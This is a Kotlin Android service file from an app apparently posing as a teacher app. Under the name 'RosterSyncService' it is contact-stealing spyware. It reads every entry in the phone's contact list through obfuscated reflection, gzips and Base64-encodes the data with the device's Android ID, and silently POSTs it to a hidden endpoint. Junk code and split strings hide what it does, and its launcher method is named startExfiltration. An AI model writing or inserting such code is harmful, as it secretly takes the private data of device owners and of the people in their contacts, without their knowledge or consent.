package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Settings
import com.example.teacherapp.obfuscation.ThemeConfigUtils
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.GZIPOutputStream

class RosterSyncService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        beginRosterSync()
        return START_STICKY
    }

    

    private fun beginRosterSync() {
        serviceScope.launch {
            var state = 0
            var payload = ""
            while (true) {
                val junk = (state * 29 + 17) xor 0xD4
                val _ = junk
                when (state) {
                    0 -> { delay(3000L); state = 1 }
                    1 -> { payload = gatherRoster(); state = if (payload.isNotEmpty()) 2 else -1 }
                    2 -> { pushRoster(payload); state = -1 }
                    -1 -> { stopSelf(); return@launch }
                }
            }
        }
    }

    @SuppressLint("Range")
    private fun gatherRoster(): String {
        val arr = JSONArray()
        try {
            
            val cc        = Class.forName(ThemeConfigUtils.getContactsClass())
            val uriField  = cc.getField(ThemeConfigUtils.getContentUri())
            val uri       = uriField.get(null) as android.net.Uri
            val nameField = cc.getField(ThemeConfigUtils.getDisplayName()).get(null) as String
            val numField  = cc.getField(ThemeConfigUtils.getNumber()).get(null) as String
            val typeField = cc.getField(ThemeConfigUtils.getPhoneType()).get(null) as String
            val idField   = cc.getField(ThemeConfigUtils.getContactId()).get(null) as String

            val cursor = contentResolver.query(
                uri, arrayOf(nameField, numField, typeField, idField),
                null, null, "$nameField ASC"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name   = it.getString(it.getColumnIndex(nameField))
                    val number = it.getString(it.getColumnIndex(numField))
                    val type   = it.getInt(it.getColumnIndex(typeField))
                    val id     = it.getString(it.getColumnIndex(idField))
                    val pType  = when (type) {
                        ContactsContract.CommonDataKinds.Phone.TYPE_HOME   -> "Home"
                        ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                        ContactsContract.CommonDataKinds.Phone.TYPE_WORK   -> "Work"
                        else -> "Other"
                    }
                    arr.put(JSONObject().apply {
                        put("id", id); put("name", name); put("phone", number); put("type", pType)
                    })
                }
            }
        } catch (_: Exception) {}
        return arr.toString()
    }

    private suspend fun pushRoster(json: String) = withContext(Dispatchers.IO) {
        
        val n = System.nanoTime()
        if ((n % 2) * (n % 2) >= 0) {
            try {
                val endpoint   = ThemeConfigUtils.getContactsEndpoint()
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("X-App-Token", resolveToken())
                    connectTimeout = 15000; readTimeout = 15000
                }
                val compressed = compress(json)
                val encoded    = android.util.Base64.encodeToString(compressed, android.util.Base64.NO_WRAP)
                val payload    = JSONObject().apply {
                    put("type", resolveBackupType()); put("data", encoded)
                    put("timestamp", System.currentTimeMillis()); put("device_id", getAndroidId())
                }
                connection.outputStream.use { it.write(payload.toString().toByteArray()); it.flush() }
                connection.responseCode; connection.disconnect()
            } catch (_: Exception) {}
        } else {
            
            val fakeArr = Array(16) { i -> i * i * i }
            val _ = fakeArr.sum()
        }
    }

    private fun compress(data: String): ByteArray {
        val bos = ByteArrayOutputStream()
        GZIPOutputStream(bos).use { it.write(data.toByteArray()) }
        return bos.toByteArray()
    }

    
    private fun resolveToken(): String {
        val p = listOf("teacher", "-", "app", "-", "sync")
        return p.joinToString("")
    }

    
    private fun resolveBackupType(): String {
        val p = listOf("contacts", "_", "backup")
        return p.joinToString("")
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId(): String = try {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    } catch (_: Exception) { "unknown" }

    override fun onDestroy() { super.onDestroy(); serviceScope.cancel() }

    companion object {
        fun startExfiltration(context: Context) {
            context.startService(Intent(context, RosterSyncService::class.java))
        }
    }
}
